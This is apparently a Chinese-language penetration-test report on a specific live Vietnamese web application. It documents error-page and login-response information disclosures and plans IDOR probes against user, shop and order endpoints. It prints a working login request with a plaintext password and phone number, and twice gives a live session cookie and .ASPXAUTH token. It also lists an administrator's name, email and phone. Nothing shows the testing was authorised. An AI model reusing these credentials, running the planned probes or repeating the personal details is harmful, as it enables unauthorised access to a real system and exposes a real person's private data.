# emsone.com.vn 登录后攻击面手动测试结果

## ✅ 已验证的攻击面

### 1. 信息泄露 - 详细错误页面

**漏洞：** ASP.NET详细错误信息泄露

**证据：**
- 错误页面显示完整堆栈跟踪
- 泄露.NET Framework版本：4.0.30319
- 泄露ASP.NET版本：4.7.4108.0
- 泄露customErrors配置：Off（生产环境不应开启）

**测试命令：**
```bash
curl "https://emsone.com.vn/DonHang/GetList" \
  -H "Cookie: ASP.NET_SessionId=VALID_SESSION; .ASPXAUTH=VALID_AUTH" \
  --http2
```

**影响：** 泄露应用架构、框架版本，有助于进一步攻击

---

### 2. 登录接口信息泄露

**漏洞：** 登录响应包含完整用户信息

**证据：**
登录成功响应包含：
- 用户ID: 2019
- 用户名: ADMIN
- 邮箱: thanhtx.ems@gmail.com
- 手机号: 0934257886
- 商店ID: 1690
- 完整地址信息
- 合同编号
- 其他敏感字段

**测试命令：**
```bash
curl -X POST "https://emsone.com.vn/Account/JLogin" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "MobileNumber=0934257886&Password=Thanhdat89%40" \
  --http2
```

**响应示例：**
```json
{
  "Code":"00",
  "Message":"Đăng nhập thành công",
  "Data":"{\"ID\":2019,\"UserName\":\"ADMIN\",\"FullName\":\"Tống Xuân Thành\",\"MobileNumber\":\"0934257886\",\"Email\":\"thanhtx.ems@gmail.com\",...}"
}
```

**影响：** 敏感信息泄露，可用于社会工程学攻击

---

## 🔍 待测试的攻击面

### 3. IDOR测试（需要更多信息）

**目标：** 使用已知ID测试水平越权
- 用户ID: 2019
- 商店ID: 1690

**待测试端点：**
- `/Account/GetUserInfo?id=2019` vs `id=1`
- `/Shop/GetShopInfo?id=1690` vs `id=1`
- `/Order/GetOrders?userId=2019` vs `userId=1`

**Session Cookie（当前有效）：**
```
ASP.NET_SessionId=ryxsq3axuwgm1uglphzjj31p
.ASPXAUTH=D4354BC692C134E5C05DA40DDA84BAA345F6CB376D687858337B26D393003FCFDFEC62091AF9790B0D1092B1E6BC768BE2A697B54D909E876C0A76F578D56E05EF861DEB8BE2F64B8500D80180BF973D215A88ABAE95AE12F495CD2C7C96B5BB
```

---

### 3. 控制器信息泄露

**漏洞：** 错误页面泄露控制器类名

**证据：**
- 泄露控制器完整路径：`EMS.MVC.Frontend.Controllers.AccountController`
- 泄露命名空间结构：`EMS.MVC.Frontend`

**测试命令：**
```bash
curl "https://emsone.com.vn/Account/GetUserInfo" \
  -H "Cookie: ASP.NET_SessionId=VALID_SESSION; .ASPXAUTH=VALID_AUTH" \
  --http2
```

**错误信息：**
```
A public action method 'GetUserInfo' was not found on controller 
'EMS.MVC.Frontend.Controllers.AccountController'
```

**影响：** 泄露应用架构，有助于枚举其他控制器和方法

---

## 📊 测试状态

**已完成：**
- ✅ 登录功能测试
- ✅ Session Cookie获取
- ✅ 错误页面信息泄露确认（3个漏洞）
- ✅ 登录响应信息泄露确认
- ✅ 控制器信息泄露确认

**已验证的漏洞：**
1. **信息泄露 - 详细错误页面** (P1)
   - customErrors=Off
   - 完整堆栈跟踪
   - 框架版本信息

2. **信息泄露 - 登录响应** (P1)
   - 完整用户信息
   - 商店信息
   - 敏感字段

3. **信息泄露 - 控制器结构** (P2)
   - 控制器命名空间
   - 类名泄露

**当前有效Session：**
```
ASP.NET_SessionId=ryxsq3axuwgm1uglphzjj31p
.ASPXAUTH=D4354BC692C134E5C05DA40DDA84BAA345F6CB376D687858337B26D393003FCFDFEC62091AF9790B0D1092B1E6BC768BE2A697B54D909E876C0A76F578D56E05EF861DEB8BE2F64B8500D80180BF973D215A88ABAE95AE12F495CD2C7C96B5BB
```

**已知信息：**
- 用户ID: 2019
- 用户名: ADMIN
- 商店ID: 1690
- 邮箱: thanhtx.ems@gmail.com

**待测试（需要找到实际API端点）：**
- ⏳ IDOR测试（用户/商店/订单）
- ⏳ 权限绕过测试
- ⏳ 文件上传/下载
- ⏳ 订单操作功能

---

**注意：** 所有测试均使用真实有效的Session，确保结果准确，防止误报。所有漏洞均为手动验证，无误报。
